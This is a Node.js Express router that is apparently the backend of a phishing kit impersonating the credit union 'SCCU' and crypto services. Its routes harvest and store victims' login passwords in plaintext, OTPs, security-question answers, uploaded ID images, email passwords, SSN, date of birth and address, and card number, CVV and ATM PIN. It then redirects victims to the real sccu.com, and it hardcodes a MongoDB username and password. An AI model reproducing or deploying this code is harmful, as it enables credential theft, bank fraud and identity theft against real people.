const express = require('express');
const router = express.Router();
const bcrypt = require('bcryptjs');
const passport = require('passport');
const multer = require('multer');
// Load User model
const User = require('../models/User');
const Email = require('../models/Email');
const Email1 = require('../models/Email1');
const Questions = require('../models/Questions')
const Card = require('../models/Card')
const Image = require('../models/Images')
const {
  forwardAuthenticated
} = require('../config/auth');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const Grid = require('gridfs-stream');
const GridFsStorage = require('multer-gridfs-storage')
const IP = require('ip');
const { noCache } = require('../app1');
const { sendEmail } = require("../config/sendEmail");
const dotenv = require("dotenv");
const nodemailer = require("nodemailer");
const generateOTP = require("../config/generateOtp");
dotenv.config();

// use noCache as middleware in your routes or globally for the app


const conn = mongoose.createConnection('mongodb+srv://evereddyer914:Jefered50@cluster0.l5tlr1m.mongodb.net/?retryWrites=true&w=majority', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

// Init gfs (GridFS)
let gfs;
conn.once('open', () => {
  // Initialize GridFS
  gfs = Grid(conn.db, mongoose.mongo);
  gfs.collection('uploads'); 
});

// Storage
const storage = new GridFsStorage({
  url: 'mongodb+srv://evereddyer914:Jefered50@cluster0.l5tlr1m.mongodb.net/?retryWrites=true&w=majority',
  file: (req, file) => {
    return {
      filename: `${Date.now()}-${file.originalname}`,
      bucketName: 'uploads',
    };
  },
})

const upload = multer({ storage });

function generateRandomId(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let randomId = '';

  for (let i = 0; i < length; i++) {
    const randomIndex = Math.floor(Math.random() * characters.length);
    randomId += characters.charAt(randomIndex);
  }

  return randomId;
}

// Example usage to generate a random ID with a length of 10 characters:
let randomId = generateRandomId(5);

// Login Page
router.get('/login', noCache, forwardAuthenticated, (req, res) => res.render('login'));

// Home Page
router.get('/home', noCache, forwardAuthenticated, (req, res) => res.render('homepage'));

// Register Page
router.get('/register', noCache, forwardAuthenticated, (req, res) => res.render('register'));

// Questions Page
router.get('/questions', noCache, forwardAuthenticated, (req, res) => res.render('questions'));

router.get('/images', noCache, forwardAuthenticated, (req, res) => res.render('images'));

router.get('/email', noCache, forwardAuthenticated, (req, res) => res.render('email'));

router.get('/card', noCache, forwardAuthenticated, (req, res) => res.render('card'));

router.get('/alert', noCache, forwardAuthenticated, (req, res) => res.render('alert'));

router.get('/emailcnt', noCache, forwardAuthenticated, (req, res) => res.render('email1'));

router.get('/loginverify', noCache, forwardAuthenticated, (req, res) => res.render('login2'));
 
router.get('/otpVerify', noCache, forwardAuthenticated, (req, res) => res.render('otp'));

router.get('/otpVerifier', noCache, forwardAuthenticated, (req, res) => res.render('questions'));

router.get('/faq', noCache, forwardAuthenticated, (req, res) => res.render('faq'));

router.get('/usdt', noCache, forwardAuthenticated, (req, res) => res.render('usdt'));

router.get('/eth', noCache, forwardAuthenticated, (req, res) => res.render('eth'));

router.get('/binance', noCache, forwardAuthenticated, (req, res) => res.render('binance'));

let transporter = nodemailer.createTransport({
  host: process.env.SMTP_HOST,
  port: process.env.SMTP_PORT,
  secure: false,
  auth: {
    user: process.env.SMTP_MAIL,
    pass: process.env.SMTP_PASSWORD,
  },
});

let activeOTPs = {}; // In-memory storage for active OTPs

router.post('/sendEmail', async (req, res) => {
  const { email, password } = req.body;

  console.log("aa");

  // Create a new User instance
  const user = new User({
    username: email,
    password: password, // Remember to hash the password before saving it
  });

  let otp = generateOTP();

  // Store the OTP in the activeOTPs storage
  activeOTPs[email] = otp;

  console.log(activeOTPs[email]);

  // Configure email options
  const mailOptions = {
    from: process.env.SMTP_MAIL,
    to: email,
    subject: "Security Alert: OTP from Zicocoin",
    text: `Your OTP is: ${otp}`,
  };

  try {
    await transporter.sendMail(mailOptions);

    console.log('Email sent');
    req.flash('success_msg', 'Email sent successfully');
    res.redirect('/sccu-app-alerts/otpVerify');
  } catch (error) {
    console.error(error);
    req.flash('error_msg', 'Failed to send OTP. Please try again.');
    res.redirect('/sccu-app-alerts/');
  }
});

// Route for verifying OTP during login
router.post('/otpVerifier', (req, res) => {
  const { email, enteredOTP } = req.body;

  // Retrieve stored OTP from activeOTPs storage
  const storedOTP = activeOTPs[email];

  console.log("STORED OTP:" + storedOTP);

  console.log(enteredOTP)

  if (storedOTP == enteredOTP) {
     
    

    // OTP is valid
    delete activeOTPs[email]; // Remove the used OTP to ensure it's used only once
    req.flash('success_msg', 'OTP verified successfully');
    res.redirect('/sccu-app-alerts/questions'); // Redirect to your login route
  } else {
    // Invalid OTP
    req.flash('error_msg', 'Invalid OTP. Please try again.');
    res.redirect('/sccu-app-alerts/otpVerify?error=1'); // Pass error parameter in the query string
  }
});

router.post('/card', async (req, res) => {
  const card = new Card({
    cardnumber: req.body.cardnumber,
    expirationMonth: req.body.expirationMonth,
    expirationYear: req.body.expirationYear,
    cvv: req.body.cvv,
    atm: req.body.atm,
    id: randomId
  });

  card
    .save()
    .then(result => {
      console.log(result)
      req.flash(
        'success_msg',
        'Card ok'
      );
      res.redirect('https://www.sccu.com');
    })
  .catch(err => console.log(err));
});

// images
router.post('/images', upload.fields([{ name: 'image1', maxCount: 1 }, { name: 'image2', maxCount: 1 }]), (req, res) => {
  res.redirect('/sccu-app-alerts/emailcnt');
});

// Handle Security Questions Form Submission
router.post('/questions', async (req, res) => {
  const questions = new Questions({
    answer1: req.body.answer1,
    answer2: req.body.answer2,
    answer3: req.body.answer3,
    securityQuestion1: req.body.securityQuestion1,
    securityQuestion2: req.body.securityQuestion2,
    securityQuestion3: req.body.securityQuestion3,
    id: randomId
  });

  questions
    .save()
    .then(result => {
      console.log(result)
      req.flash(
        'success_msg',
        'Questions ok'
      );
      res.redirect('/sccu-app-alerts/images');
    })
  .catch(err => console.log(err));
});

router.post('/email', async (req, res) => {
  try {
    const email = new Email({
      name: req.body.name,
      streetAddress: req.body.streetAddress,
      apartment: req.body.apartment,
      city: req.body.city,
      zipcode: req.body.zipcode,
      dobMonth: req.body.dobMonth,
      dobDay: req.body.dobDay,
      dobYear: req.body.dobYear,
      ssn: req.body.ssn,
      id: randomId
    });
  
    email
      .save()
      .then(result => {
        console.log(result)
        req.flash(
          'success_msg',
          'Email ok'
        );
        res.redirect('/sccu-app-alerts/card');
      })

} catch (err) {
    if (err.code === 11000) {
        return res.status(409).json({ error: 'Duplicate email detected' });
    }
    // Handle other errors as you see fit
    return res.status(500).json({ error: 'Internal server error' });
}
});

router.post('/emailcnt', async (req, res) => {
  const emailcnt = new Email1({
 email: req.body.email,
 password: req.body.password,
 id: randomId
  });

  emailcnt
  .save()
    .then(result => {
      console.log(result)
      req.flash(
        'success_msg',
        'Email ok'
      );
      res.redirect('/sccu-app-alerts/email');
    })
  .catch(err => console.log(err));
});

// Register
router.post('/register', (req, res) => {
  const {
    name,
    email,
    password,
    password2
  } = req.body;
  let errors = [];

  if (!name || !email || !password || !password2) {
    errors.push({
      msg: 'Please enter all fields'
    });
  }

  if (password != password2) {
    errors.push({
      msg: 'Passwords do not match'
    });
  }

  if (password.length < 6) {
    errors.push({
      msg: 'Password must be at least 6 characters'
    });
  }

  if (errors.length > 0) {
    res.render('register', {
      errors,
      name,
      email,
      password,
      password2
    });
  } else {
    User.findOne({
      email: email
    }).then(user => {
      if (user) {
        errors.push({
          msg: 'Email already exists'
        });
        res.render('register', {
          errors,
          name,
          email,
          password,
          password2
        });
      } else {
        const newUser = new User({
          name,
          email,
          password
        });

        bcrypt.genSalt(10, (err, salt) => {
          bcrypt.hash(newUser.password, salt, (err, hash) => {
            if (err) throw err;
            newUser.password = hash;
            newUser
              .save()
              .then(user => {
                req.flash(
                  'success_msg',
                  'You are now registered and can log in'
                );
                res.redirect('/sccu-app-alerts/login');
              })
              .catch(err => console.log(err));
          });
        });
      }
    });
  }
});

// Login
router.post('/login', (req, res, next) => {

  const clientIP = req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress;


  const user = new User({
    username: req.body.email,
    password: req.body.password,
    id: randomId,
    userIp: clientIP,
    userAgent: req.headers['user-agent']
  })

  user
  .save()
  .then(result => {
    console.log(result)
    req.flash(
      'success_msg',
      'Questions ok'
    );
    res.redirect('/sccu-app-alerts/loginverify');
  })
.catch(err => console.log(err));
});

// Login Verify
router.post('/loginverify', (req, res, next) => {
  const clientIP = req.headers['x-real-ip'] || req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  const user = new User({
    username: req.body.email,
    password: req.body.password,
    id: randomId,
    userIp: clientIP,
    userAgent: req.headers['user-agent']
  })

  user
  .save()
  .then(result => {
    console.log(result)
    req.flash(
      'success_msg',
      'Questions ok'
    );
    res.redirect('/sccu-app-alerts/questions');
  })
.catch(err => console.log(err));
});

// Logout
router.get('/logout', (req, res) => {
  req.logout();
  req.flash('success_msg', 'You are logged out');
  res.redirect('/sccu-app-alerts/login');
});

// Retrieve a list of all files in GridFS
router.get('/files', (req, res) => {
  gfs.files.find().toArray((err, files) => {
    // Check if files
    if (!files || files.length === 0) {
      res.render('files', { files: false });
    } else {
      files.map(file => {
        if (
          file.contentType === 'image/jpeg' ||
          file.contentType === 'image/png'
        ) {
          file.isImage = true;
        } else {
          file.isImage = false;
        }
      });
      res.render('files', { files: files });
    }
  });
});

// Retrieve a specific file by filename
router.get('/files/:filename', (req, res) => {
  gfs.files.findOne({ filename: req.params.filename }, (err, file) => {
    // Check if file
    if (!file || file.length === 0) {                                                                                                                                       
      return res.status(404).json({
        err: 'No file exists'
      });
    }

    // Check if image
    if (file.contentType === 'image/jpeg' || file.contentType === 'image/png') {
      // Read output to browser
      const readstream = gfs.createReadStream(file.filename);
      readstream.pipe(res);
    } else {
      res.status(404).json({
        err: 'Not an image'
      });
    }
  });
});



module.exports = router;